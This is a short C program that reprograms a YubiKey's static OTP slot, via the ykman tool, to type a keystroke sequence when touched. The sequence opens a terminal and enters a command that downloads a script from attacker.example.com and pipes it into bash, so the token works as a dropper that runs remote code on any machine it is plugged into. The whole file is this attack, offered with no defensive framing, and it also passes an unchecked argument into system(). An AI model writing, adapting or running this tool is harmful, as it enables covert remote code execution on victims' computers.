#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    if (argc != 2) {
        return 1;
    }
   
    char devpath[64], cmd[512];
    snprintf(devpath, sizeof(devpath), "/dev/%s", argv[1]);

    const char *payload =
      "{CTRL}{ALT}t"
      "{DELAY1000}"
      "bash -c 'curl -s http://attacker.example.com/payload.sh | bash'"
      "{ENTER}";

    snprintf(cmd, sizeof(cmd),
        "ykman --device %s otp static --slot 1 set \"%s\"",
        devpath, payload);

    return system(cmd);
}
